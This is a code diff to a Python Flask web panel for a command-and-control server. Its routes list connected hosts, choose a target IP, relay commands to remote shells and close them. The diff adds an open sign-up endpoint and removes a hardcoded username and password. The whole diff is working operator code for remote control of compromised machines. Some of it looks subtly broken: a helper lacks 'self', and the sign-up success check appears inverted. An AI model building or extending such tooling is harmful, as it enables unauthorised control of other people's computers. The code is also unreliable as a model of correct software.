@@ -35,10 +35,21 @@ class FlskSevrev(object):
         logout_user()
         return redirect(url_for('loginPage'))
     
+    def _getKey(dct, key, default=None):
+        if isinstance(dct, dict):
+            return dct.get(key, default)
+        return default
 
+    def signUp(self):
+        data = request.get_json()
+        username = self._getKey(dct=data,key='username',default='')
+        password = self._getKey(dct=data,key='password',default='')
+        if not self.dbaction.insert_user(username, password):
+            return jsonify({"message": "Sign Up successful"})
+        return jsonify({"message": "Something went wrong while processing your request"}), 401
+    
     def login(self):
         if request.method == 'POST':
-            self.dbaction.insert_user('Aharon','Aa123456')
             data = request.get_json()
             username = data['username']
             password = data['password']
@@ -49,47 +60,46 @@ class FlskSevrev(object):
             else:
                 return jsonify({"message": "Invalid username or password"}), 401
         return self.loginPage()
-
-
-    @login_required
-    def getshell(self,hostname):
+    
+    def getshellChat(self,hostname):
         if self.c2Server.connections.isconnected(hostname):
             return render_template('ChatBox.html',hostname=hostname)
         return make_response("Page not found", 404)
     
-    @login_required
+    def shellPage(self):
+        return render_template('ChatBox.html')
+ 
+    
     def choseTarget(self):
         data = request.get_json()
         self.c2Server.connections.connctTo = data['ip']
         return {'Status': 'Completed'}
 
-
-    @login_required
     def listConnections(self):
         return self.c2Server.connections.connections
     
-
-    @login_required
+    
     def homePage(self):
         return render_template('Index.html')
     
-
-    @login_required
+   
     def send_message(self):
         data = request.get_json()
         connObj = self.c2Server.connections.getConnObj(data['ip'])
         msg = self.c2Server.retriveCommand(connObj,data['message'])
         return {'message': msg}
     
-
-    @login_required
+   
     def closeShell(self):
         data = request.get_json()
         connObj = self.c2Server.connections.getConnObj(data['ip'])
         self.c2Server.sendMsg(connObj,b'exit')
         self.c2Server.connections.disconnect(data['ip'])
         return {'Status':"Disconnect"}
-
+    
+    
+    def listShellConnections(self):
+        return self.c2Server.connections.getShellConntions()
 
 
     def _ruleResetor(self):
@@ -98,7 +108,8 @@ class FlskSevrev(object):
         self.app.add_url_rule('/logout', 'logout', self.logout)
         self.app.add_url_rule('/home', 'homePage', login_required(self.homePage))
         self.app.add_url_rule('/listConnections', 'listConnections', login_required(self.listConnections))
-        self.app.add_url_rule('/getshell/<hostname>', 'getshell', login_required(self.getshell))
+        self.app.add_url_rule('/shellPage', 'shellPage', login_required(self.shellPage))
         self.app.add_url_rule('/send_message', 'send_message', login_required(self.send_message), methods=['POST'])
         self.app.add_url_rule('/closeShell', 'closeShell', login_required(self.closeShell), methods=['POST'])
         self.app.add_url_rule('/choseTarget', 'choseTarget', login_required(self.choseTarget), methods=['POST'])
+        self.app.add_url_rule('/listShellConnections', 'listShellConnections', login_required(self.listShellConnections))
